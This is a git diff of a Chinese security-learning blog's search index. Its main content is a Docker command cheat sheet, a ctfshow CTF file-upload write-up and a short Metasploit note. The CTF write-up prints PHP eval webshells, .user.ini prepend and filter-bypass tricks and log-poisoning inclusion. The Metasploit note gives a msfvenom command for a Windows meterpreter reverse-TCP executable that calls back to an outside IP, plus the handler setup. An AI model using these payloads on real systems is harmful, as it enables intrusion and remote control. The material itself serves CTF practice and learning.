-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker ps -a</span><br></pre></td></tr></table></figure>
-<h3 id="统计信息"><a class="header-anchor" href="#统计信息">¶</a>统计信息</h3>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker stats</span><br></pre></td></tr></table></figure>
-<h3 id="启动容器"><a class="header-anchor" href="#启动容器">¶</a>启动容器</h3>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker start 容器名/容器ID</span><br></pre></td></tr></table></figure>
-<h3 id="重启容器"><a class="header-anchor" href="#重启容器">¶</a>重启容器</h3>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker restart 容器名/容器ID</span><br></pre></td></tr></table></figure>
-<h3 id="终止容器"><a class="header-anchor" href="#终止容器">¶</a>终止容器</h3>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker stop 容器名/容器ID</span><br></pre></td></tr></table></figure>
-<h3 id="终止所有容器"><a class="header-anchor" href="#终止所有容器">¶</a>终止所有容器</h3>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker stop $(docker ps -aq)</span><br></pre></td></tr></table></figure>
-<h3 id="连接容器"><a class="header-anchor" href="#连接容器">¶</a>连接容器</h3>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker <span class="built_in">exec</span> -it 容器名/容器ID /bin/bash</span><br></pre></td></tr></table></figure>
-<h3 id="删除容器"><a class="header-anchor" href="#删除容器">¶</a>删除容器</h3>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker rm 容器名/容器ID</span><br></pre></td></tr></table></figure>
-<h3 id="删除所有容器"><a class="header-anchor" href="#删除所有容器">¶</a>删除所有容器</h3>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker rm $(docker ps -aq)</span><br></pre></td></tr></table></figure>
-<h3 id="删除镜像"><a class="header-anchor" href="#删除镜像">¶</a>删除镜像</h3>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker rmi 镜像名/容器ID</span><br></pre></td></tr></table></figure>
-<h3 id="删除所有镜像"><a class="header-anchor" href="#删除所有镜像">¶</a>删除所有镜像</h3>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker rmi $(docker images -q)</span><br></pre></td></tr></table></figure>
-<h3 id="端口映射"><a class="header-anchor" href="#端口映射">¶</a>端口映射</h3>
-<p>部署一个容器，并将80端口映射到宿主机的8000端口上</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 可以使用--name自定义部署的容器名</span></span><br><span class="line">docker run -d -p 8000:80 --name 容器名 镜像名</span><br><span class="line"></span><br><span class="line"><span class="comment"># 也可以直接通过镜像部署</span></span><br><span class="line">docker run -d -p 8000:80 镜像名</span><br></pre></td></tr></table></figure>
-<h3 id="dockerfile-部署镜像"><a class="header-anchor" href="#dockerfile-部署镜像">¶</a>dockerfile 部署镜像</h3>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker build -t 自定义镜像名称 .</span><br></pre></td></tr></table></figure>
-<h3 id="docker-compose-部署"><a class="header-anchor" href="#docker-compose-部署">¶</a>docker-compose 部署</h3>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
-<h3 id="构建新的镜像"><a class="header-anchor" href="#构建新的镜像">¶</a>构建新的镜像</h3>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker commit -a <span class="string">&quot;提交的镜像作者&quot;</span> -m <span class="string">&quot;提交时的说明文字&quot;</span> 容器的ID 要创建的新的镜像</span><br><span class="line">docker commit -a <span class="string">&quot;L1yee&quot;</span> -m <span class="string">&quot;wordpress_phpmyadmin&quot;</span> d64655e87ccc wordpress_phpmyadmin:v1</span><br></pre></td></tr></table></figure>
-<h3 id="保存离线镜像"><a class="header-anchor" href="#保存离线镜像">¶</a>保存离线镜像</h3>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker save -o 镜像文件名.tar 要保持的镜像</span><br><span class="line">docker save -o wordpress_phpmyadmin.tar wordpress_phpmyadmin:latest</span><br></pre></td></tr></table></figure>
-<h3 id="导入离线镜像"><a class="header-anchor" href="#导入离线镜像">¶</a>导入离线镜像</h3>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker load --input 镜像文件名.tar</span><br><span class="line">docker load --input wordpress_phpmyadmin.tar</span><br></pre></td></tr></table></figure>
-<h3 id="挂载卷"><a class="header-anchor" href="#挂载卷">¶</a>挂载卷</h3>
-<p>看下面的这个案例理解一下就明白了：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -d -p 9088:80 --name wordpress_phpmyadmin -v <span class="string">&quot;`pwd`/mysql&quot;</span>:/var/lib/mysql/ -v <span class="string">&quot;`pwd`/app&quot;</span>:/app/ wordpress_phpmyadmin:latest</span><br></pre></td></tr></table></figure>
-<h2 id="docker-compose-安装"><a class="header-anchor" href="#docker-compose-安装">¶</a>docker-compose 安装</h2>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 下载docker-compose</span></span><br><span class="line">curl -L https://github.com/docker/compose/releases/download/1.25.0-rc2/docker-compose-`uname -s`-`uname -m` -o /usr/<span class="built_in">local</span>/bin/docker-compose</span><br><span class="line"></span><br><span class="line"><span class="comment"># 给docker-compose执行权限</span></span><br><span class="line">chmod +x /usr/<span class="built_in">local</span>/bin/docker-compose</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看docker compose版本</span></span><br><span class="line">root@kali-linux:~<span class="comment"># docker-compose  version</span></span><br><span class="line">docker-compose version 1.25.0-rc2, build 661ac20e</span><br><span class="line">docker-py version: 4.0.1</span><br><span class="line">CPython version: 3.7.4</span><br><span class="line">OpenSSL version: OpenSSL 1.1.0k  28 May 2019</span><br></pre></td></tr></table></figure>
-<p>docker-compose 其他命令参考https://www.jianshu.com/p/658911a8cff3</p>
-<h2 id="安装实例"><a class="header-anchor" href="#安装实例">¶</a>安装实例</h2>
-<p>安装awvs</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#  pull 拉取下载镜像</span></span><br><span class="line">docker pull secfa/docker-awvs</span><br><span class="line"></span><br><span class="line"><span class="comment">#  将Docker的3443端口映射到物理机的 13443端口</span></span><br><span class="line">docker run -it -d -p 13443:3443 secfa/docker-awvs</span><br><span class="line"></span><br><span class="line"><span class="comment"># 容器的相关信息</span></span><br><span class="line">awvs13 username: admin@admin.com</span><br><span class="line">awvs13 password: Admin123</span><br><span class="line">AWVS版本：13.0.200217097</span><br></pre></td></tr></table></figure>
-<p>参:<a href="https://www.sqlsec.com/2020/04/awvs.html">https://www.sqlsec.com/2020/04/awvs.html</a></p>
-]]></content>
-      <categories>
-        <category>前端</category>
-        <category>docker</category>
-      </categories>
-  </entry>
-  <entry>
     <title>ctfshow入门命令执行部分</title>
     <url>/2020/11/16/ctfshow%20web%20%E5%85%A5%E9%97%A8%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E9%83%A8%E5%88%86/</url>
     <content><![CDATA[<p>ctfshow web入门 命令执行部分(不断更新)</p>
@@ -875,6 +730,151 @@ payload: cat flag.php||</p>
       </categories>
   </entry>
   <entry>
+    <title>ctfshow入门之文件上传</title>
+    <url>/2021/01/15/ctfshow%E5%85%A5%E9%97%A8%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
+    <content><![CDATA[<h2 id="151-152"><a class="header-anchor" href="#151-152">¶</a>151-152</h2>
+<p>传一个后缀为png的一句话,bp抓包改后缀 蚁剑连接即可</p>
+<h2 id="153"><a class="header-anchor" href="#153">¶</a>153</h2>
+<p>传了后缀为.php5的一句话 发现能成功上传但是 无法解析</p>
+<p><img src="https://img-blog.csdnimg.cn/20210116130923265.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>看看大佬的wp,学了新姿势</p>
+<h3 id="前置知识"><a class="header-anchor" href="#前置知识">¶</a>前置知识</h3>
+<p><a href="https://wh1tecell.top/2021/01/16/htaccess%E5%92%8C-user-ini%E6%96%87%E4%BB%B6%E7%9A%84%E5%A6%99%E7%94%A8/">.user.ini的妙用</a></p>
+<h3 id="解题步骤"><a class="header-anchor" href="#解题步骤">¶</a>解题步骤</h3>
+<p>尝试上传.user.ini,发现上传成功<br>
+<img src="https://img-blog.csdnimg.cn/2021011623593150.png" alt="在这里插入图片描述"></p>
+<p>文件内容:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GIF89</span><br><span class="line">auto_prepend_file &#x3D; 1.php</span><br></pre></td></tr></table></figure>
+<p>然后上传一张图片马,1.php<br>
+文件内容:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">@eval($_POST[&#39;flag&#39;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>然后访问 /upload</p>
+<p>payload:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#x3D;system(&#39;cat ..&#x2F;f*&#39;);</span><br></pre></td></tr></table></figure>
+<h2 id="154"><a class="header-anchor" href="#154">¶</a>154</h2>
+<p>上传后缀为png的一句话发现文件内容不符合条件</p>
+<p>发现是php这个字符串不能出现</p>
+<p>于是pHp 大写成功绕过</p>
+<p>然后跟上一题一样的解法 蚁剑连接</p>
+<p><img src="https://img-blog.csdnimg.cn/2021011700022841.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>得到flag</p>
+<h2 id="155"><a class="header-anchor" href="#155">¶</a>155</h2>
+<p>大写绕过不行了</p>
+<p>尝试使用短标签绕过<br>
+对于php的标签其他写法有四种</p>
+<p>1、前提是开启配置参数short_open_tags=on</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;? echo &#39;123&#39;;?&gt;</span><br></pre></td></tr></table></figure>
+<p>2、 不需要开启参数设置</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?&#x3D;(表达式)?&gt;  等价于 &lt;?php echo (表达式)?&gt;</span><br></pre></td></tr></table></figure>
+<p>3、前提是开启配置参数asp_tags=on，经过测试发现7.0及以上修改完之后也不能使用，而是报500错误，但是7.0以下版本在修改完配置后就可以使用了。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;% echo &#39;123&#39;;%&gt;</span><br></pre></td></tr></table></figure>
+<p>4、不需要修改参数开关，但是只能在7.0以下可用。<br>
+对于该题，我们可用使用<code>&lt;?=(表达式)?&gt;</code>进行绕过，图片内容 <code>&lt;?=eval($_POST[flag]);?&gt;</code><br>
+剩下的步骤同153</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script language&#x3D;&quot;php&quot;&gt;echo &#39;123&#39;; &lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="156"><a class="header-anchor" href="#156">¶</a>156</h2>
+<p>在前面的基础上过滤了 []那我们直接用{}来代替<br>
+图片马内容</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?&#x3D;eval($_POST&#123;1&#125;);?&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="157-159"><a class="header-anchor" href="#157-159">¶</a>157-159</h2>
+<p>直接将图片内容换成这个。。。算是投机取巧的方法吧  毕竟知道flag在哪里</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">aa.png</span><br><span class="line"></span><br><span class="line">&lt;?&#x3D;&#96;tac ..&#x2F;f*&#96;?&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="160"><a class="header-anchor" href="#160">¶</a>160</h2>
+<p>使用 日志包含</p>
+<p>过滤了括号反引号还有一些关键字<br>
+利用日志包含绕过，图片内容<?=include"/var/lo"."g/nginx/access.lo"."g"?>因为log被过滤了。所以用拼接绕过<br>
+上传完.user.ini和图片后<br>
+访问网站然后修改ua头信息</p>
+<p><img src="https://img-blog.csdnimg.cn/20210122154255213.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>接着访问/upload目录 就可</p>
+]]></content>
+      <categories>
+        <category>刷题站</category>
+        <category>ctfshow</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>docker之温故知新</title>
+    <url>/2021/02/11/docker%E4%B9%8B%E6%B8%A9%E6%95%85%E7%9F%A5%E6%96%B0/</url>
+    <content><![CDATA[<h2 id="Docker-安装"><a class="header-anchor" href="#Docker-安装">¶</a>Docker 安装</h2>
+<h3 id="Ubuntu-CentOS-安装"><a class="header-anchor" href="#Ubuntu-CentOS-安装">¶</a>Ubuntu/CentOS 安装</h3>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -fsSL get.docker.com -o get-docker.sh</span><br><span class="line">sudo sh get-docker.sh --mirror Aliyun</span><br></pre></td></tr></table></figure>
+<h3 id="Kali-Debian-安装"><a class="header-anchor" href="#Kali-Debian-安装">¶</a>Kali/Debian 安装</h3>
+<p>Kali 是基于 Debian 封装的，所以两者安装方法大同小异。<br>
+Kali Linux 安装 Docker 用网上那个一键安装脚本貌似有点问题，这里单独记录一下，以便自己和其他网友使用：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 添加Docker PGP密钥</span></span><br><span class="line">curl -fsSL https://download.docker.com/linux/debian/gpg | sudo apt-key add -</span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置docker apt源 我这里用的国内阿里云的docker下载源</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;deb https://mirrors.aliyun.com/docker-ce/linux/debian buster stable&#x27;</span>&gt; /etc/apt/sources.list.d/docker.list</span><br><span class="line"></span><br><span class="line"><span class="comment"># 更新apt源</span></span><br><span class="line">apt update</span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果之前安装了docker的话 这里得卸载旧版本docker</span></span><br><span class="line">apt remove docker docker-engine docker.io</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装docker</span></span><br><span class="line">apt install docker-ce</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看版本</span></span><br><span class="line">docker version</span><br></pre></td></tr></table></figure>
+<h3 id="开机自启设置"><a class="header-anchor" href="#开机自启设置">¶</a>开机自启设置</h3>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo systemctl <span class="built_in">enable</span> docker</span><br><span class="line">sudo systemctl start docker</span><br></pre></td></tr></table></figure>
+<h2 id="Docker-优化"><a class="header-anchor" href="#Docker-优化">¶</a>Docker 优化</h2>
+<h3 id="Docker-国内加速器"><a class="header-anchor" href="#Docker-国内加速器">¶</a>Docker 国内加速器</h3>
+<p>不替换源对话，docker pull 拉去镜像对速度实在太龟速了，如果你很佛系对话可以不进行更换</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 编辑这个文件，如果没有对话就创建这个文件</span></span><br><span class="line">vim /etc/docker/daemon.json</span><br></pre></td></tr></table></figure>
+<p>替换内容如下</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;registry-mirrors&quot;: [</span><br><span class="line">    &quot;http:&#x2F;&#x2F;hub-mirror.c.163.com&quot;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里我使用对是国内163网易源，其他源可以自行百度替换。<br>
+配置完成后重启服务才可以生效：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo systemctl daemon-reload</span><br><span class="line">sudo systemctl restart docker</span><br></pre></td></tr></table></figure>
+<h2 id="Docker-基础命令"><a class="header-anchor" href="#Docker-基础命令">¶</a>Docker 基础命令</h2>
+<h3 id="搜索镜像"><a class="header-anchor" href="#搜索镜像">¶</a>搜索镜像</h3>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker search 关键词</span><br></pre></td></tr></table></figure>
+<h3 id="下载镜像"><a class="header-anchor" href="#下载镜像">¶</a>下载镜像</h3>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker pull 镜像名</span><br></pre></td></tr></table></figure>
+<h3 id="查看已下载的镜像列表"><a class="header-anchor" href="#查看已下载的镜像列表">¶</a>查看已下载的镜像列表</h3>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker image ls</span><br></pre></td></tr></table></figure>
+<h3 id="创建并使用容器"><a class="header-anchor" href="#创建并使用容器">¶</a>创建并使用容器</h3>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -it --name 容器名 镜像名/镜像ID /bin/bash</span><br></pre></td></tr></table></figure>
+<h3 id="查看当前容器"><a class="header-anchor" href="#查看当前容器">¶</a>查看当前容器</h3>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker ps -a</span><br></pre></td></tr></table></figure>
+<h3 id="统计信息"><a class="header-anchor" href="#统计信息">¶</a>统计信息</h3>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker stats</span><br></pre></td></tr></table></figure>
+<h3 id="启动容器"><a class="header-anchor" href="#启动容器">¶</a>启动容器</h3>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker start 容器名/容器ID</span><br></pre></td></tr></table></figure>
+<h3 id="重启容器"><a class="header-anchor" href="#重启容器">¶</a>重启容器</h3>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker restart 容器名/容器ID</span><br></pre></td></tr></table></figure>
+<h3 id="终止容器"><a class="header-anchor" href="#终止容器">¶</a>终止容器</h3>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker stop 容器名/容器ID</span><br></pre></td></tr></table></figure>
+<h3 id="终止所有容器"><a class="header-anchor" href="#终止所有容器">¶</a>终止所有容器</h3>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker stop $(docker ps -aq)</span><br></pre></td></tr></table></figure>
+<h3 id="连接容器"><a class="header-anchor" href="#连接容器">¶</a>连接容器</h3>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker <span class="built_in">exec</span> -it 容器名/容器ID /bin/bash</span><br></pre></td></tr></table></figure>
+<h3 id="删除容器"><a class="header-anchor" href="#删除容器">¶</a>删除容器</h3>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker rm 容器名/容器ID</span><br></pre></td></tr></table></figure>
+<h3 id="删除所有容器"><a class="header-anchor" href="#删除所有容器">¶</a>删除所有容器</h3>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker rm $(docker ps -aq)</span><br></pre></td></tr></table></figure>
+<h3 id="删除镜像"><a class="header-anchor" href="#删除镜像">¶</a>删除镜像</h3>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker rmi 镜像名/容器ID</span><br></pre></td></tr></table></figure>
+<h3 id="删除所有镜像"><a class="header-anchor" href="#删除所有镜像">¶</a>删除所有镜像</h3>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker rmi $(docker images -q)</span><br></pre></td></tr></table></figure>
+<h3 id="端口映射"><a class="header-anchor" href="#端口映射">¶</a>端口映射</h3>
+<p>部署一个容器，并将80端口映射到宿主机的8000端口上</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 可以使用--name自定义部署的容器名</span></span><br><span class="line">docker run -d -p 8000:80 --name 容器名 镜像名</span><br><span class="line"></span><br><span class="line"><span class="comment"># 也可以直接通过镜像部署</span></span><br><span class="line">docker run -d -p 8000:80 镜像名</span><br></pre></td></tr></table></figure>
+<h3 id="dockerfile-部署镜像"><a class="header-anchor" href="#dockerfile-部署镜像">¶</a>dockerfile 部署镜像</h3>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker build -t 自定义镜像名称 .</span><br></pre></td></tr></table></figure>
+<h3 id="docker-compose-部署"><a class="header-anchor" href="#docker-compose-部署">¶</a>docker-compose 部署</h3>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
+<h3 id="构建新的镜像"><a class="header-anchor" href="#构建新的镜像">¶</a>构建新的镜像</h3>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker commit -a <span class="string">&quot;提交的镜像作者&quot;</span> -m <span class="string">&quot;提交时的说明文字&quot;</span> 容器的ID 要创建的新的镜像</span><br><span class="line">docker commit -a <span class="string">&quot;L1yee&quot;</span> -m <span class="string">&quot;wordpress_phpmyadmin&quot;</span> d64655e87ccc wordpress_phpmyadmin:v1</span><br></pre></td></tr></table></figure>
+<h3 id="保存离线镜像"><a class="header-anchor" href="#保存离线镜像">¶</a>保存离线镜像</h3>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker save -o 镜像文件名.tar 要保持的镜像</span><br><span class="line">docker save -o wordpress_phpmyadmin.tar wordpress_phpmyadmin:latest</span><br></pre></td></tr></table></figure>
+<h3 id="导入离线镜像"><a class="header-anchor" href="#导入离线镜像">¶</a>导入离线镜像</h3>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker load --input 镜像文件名.tar</span><br><span class="line">docker load --input wordpress_phpmyadmin.tar</span><br></pre></td></tr></table></figure>
+<h3 id="挂载卷"><a class="header-anchor" href="#挂载卷">¶</a>挂载卷</h3>
+<p>看下面的这个案例理解一下就明白了：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -d -p 9088:80 --name wordpress_phpmyadmin -v <span class="string">&quot;`pwd`/mysql&quot;</span>:/var/lib/mysql/ -v <span class="string">&quot;`pwd`/app&quot;</span>:/app/ wordpress_phpmyadmin:latest</span><br></pre></td></tr></table></figure>
+<h2 id="docker-compose-安装"><a class="header-anchor" href="#docker-compose-安装">¶</a>docker-compose 安装</h2>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 下载docker-compose</span></span><br><span class="line">curl -L https://github.com/docker/compose/releases/download/1.25.0-rc2/docker-compose-`uname -s`-`uname -m` -o /usr/<span class="built_in">local</span>/bin/docker-compose</span><br><span class="line"></span><br><span class="line"><span class="comment"># 给docker-compose执行权限</span></span><br><span class="line">chmod +x /usr/<span class="built_in">local</span>/bin/docker-compose</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看docker compose版本</span></span><br><span class="line">root@kali-linux:~<span class="comment"># docker-compose  version</span></span><br><span class="line">docker-compose version 1.25.0-rc2, build 661ac20e</span><br><span class="line">docker-py version: 4.0.1</span><br><span class="line">CPython version: 3.7.4</span><br><span class="line">OpenSSL version: OpenSSL 1.1.0k  28 May 2019</span><br></pre></td></tr></table></figure>
+<p>docker-compose 其他命令参考https://www.jianshu.com/p/658911a8cff3</p>
+<h2 id="安装实例"><a class="header-anchor" href="#安装实例">¶</a>安装实例</h2>
+<p>安装awvs</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#  pull 拉取下载镜像</span></span><br><span class="line">docker pull secfa/docker-awvs</span><br><span class="line"></span><br><span class="line"><span class="comment">#  将Docker的3443端口映射到物理机的 13443端口</span></span><br><span class="line">docker run -it -d -p 13443:3443 secfa/docker-awvs</span><br><span class="line"></span><br><span class="line"><span class="comment"># 容器的相关信息</span></span><br><span class="line">awvs13 username: admin@admin.com</span><br><span class="line">awvs13 password: Admin123</span><br><span class="line">AWVS版本：13.0.200217097</span><br></pre></td></tr></table></figure>
+<p>参:<a href="https://www.sqlsec.com/2020/04/awvs.html">https://www.sqlsec.com/2020/04/awvs.html</a></p>
+]]></content>
+      <categories>
+        <category>前端</category>
+        <category>docker</category>
+      </categories>
+  </entry>
+  <entry>
     <title>hashcat安装及其使用教程</title>
     <url>/2021/01/25/hashcat%E5%AE%89%E8%A3%85%E5%8F%8A%E5%85%B6%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/</url>
     <content><![CDATA[<h3 id="hashcat简介"><a class="header-anchor" href="#hashcat简介">¶</a>hashcat简介</h3>
@@ -930,6 +930,23 @@ payload: cat flag.php||</p>
       <categories>
         <category>工具</category>
         <category>hashcat</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>msf的shell在windows中的利用</title>
+    <url>/2020/12/20/msfvenom%E7%9A%84shell%E5%9C%A8windows%E4%B8%AD%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
+    <content><![CDATA[<p>msf的shell的制作</p>
+<a id="more"></a>
+<h3 id="msfvenom生成shell-exe"><a class="header-anchor" href="#msfvenom生成shell-exe">¶</a><strong>msfvenom生成shell.exe</strong></h3>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;222.222.221.140 lport&#x3D;1211 -f exe &gt; &#x2F;root&#x2F;shell.exe</span><br></pre></td></tr></table></figure>
+<h3 id="启动metasploit"><a class="header-anchor" href="#启动metasploit">¶</a>启动metasploit</h3>
+<p>输入命令：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure>
+<h3 id="metasploit侦听"><a class="header-anchor" href="#metasploit侦听">¶</a><strong>metasploit侦听</strong></h3>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msf &gt; use exploit&#x2F;multi&#x2F;handler     #加载模块</span><br><span class="line">msf exploit(multi&#x2F;handler) &gt; set payload windows&#x2F;meterpreter&#x2F;reverse_tcp    #设置payload</span><br><span class="line">payload &#x3D;&gt; windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">msf exploit(multi&#x2F;handler) &gt; set lhost kali的ip   #设置kali的ip</span><br><span class="line">lhost &#x3D;&gt; 192.168.152.131</span><br><span class="line">msf exploit(multi&#x2F;handler) &gt; set lport 1211   #设置kali的端口</span><br><span class="line">lport &#x3D;&gt; 1211</span><br><span class="line">msf exploit(multi&#x2F;handler) &gt; exploit   #执行</span><br><span class="line">[*] Started reverse TCP handler on 222.222.221.140:1211 </span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>渗透测试</category>
+        <category>msf shell制作</category>
       </categories>
   </entry>
   <entry>
@@ -994,23 +1011,6 @@ payload: cat flag.php||</p>
       </categories>
   </entry>
   <entry>
-    <title>msf的shell在windows中的利用</title>
-    <url>/2020/12/20/msfvenom%E7%9A%84shell%E5%9C%A8windows%E4%B8%AD%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
-    <content><![CDATA[<p>msf的shell的制作</p>
-<a id="more"></a>
-<h3 id="msfvenom生成shell-exe"><a class="header-anchor" href="#msfvenom生成shell-exe">¶</a><strong>msfvenom生成shell.exe</strong></h3>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;222.222.221.140 lport&#x3D;1211 -f exe &gt; &#x2F;root&#x2F;shell.exe</span><br></pre></td></tr></table></figure>
-<h3 id="启动metasploit"><a class="header-anchor" href="#启动metasploit">¶</a>启动metasploit</h3>
-<p>输入命令：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure>
-<h3 id="metasploit侦听"><a class="header-anchor" href="#metasploit侦听">¶</a><strong>metasploit侦听</strong></h3>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msf &gt; use exploit&#x2F;multi&#x2F;handler     #加载模块</span><br><span class="line">msf exploit(multi&#x2F;handler) &gt; set payload windows&#x2F;meterpreter&#x2F;reverse_tcp    #设置payload</span><br><span class="line">payload &#x3D;&gt; windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">msf exploit(multi&#x2F;handler) &gt; set lhost kali的ip   #设置kali的ip</span><br><span class="line">lhost &#x3D;&gt; 192.168.152.131</span><br><span class="line">msf exploit(multi&#x2F;handler) &gt; set lport 1211   #设置kali的端口</span><br><span class="line">lport &#x3D;&gt; 1211</span><br><span class="line">msf exploit(multi&#x2F;handler) &gt; exploit   #执行</span><br><span class="line">[*] Started reverse TCP handler on 222.222.221.140:1211 </span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>渗透测试</category>
-        <category>msf shell制作</category>
-      </categories>
-  </entry>
-  <entry>
     <title>记一题php$$变量覆盖</title>
     <url>/2021/01/09/php$$%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/</url>
     <content><![CDATA[<p>彻底学一下$$变量覆盖</p>
@@ -1054,6 +1054,47 @@ payload: cat flag.php||</p>
       <categories>
         <category>web技术学习</category>
         <category>常见黑魔法</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>php伪随机数漏洞</title>
+    <url>/2020/10/10/php%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0/</url>
+    <content><![CDATA[<p>针对ctf中伪随机数漏洞利用的小结</p>
+<a id="more"></a>
+<h2 id="相关函数"><a class="header-anchor" href="#相关函数">¶</a>相关函数</h2>
+<h3 id="mt-rand"><a class="header-anchor" href="#mt-rand">¶</a>mt_rand()</h3>
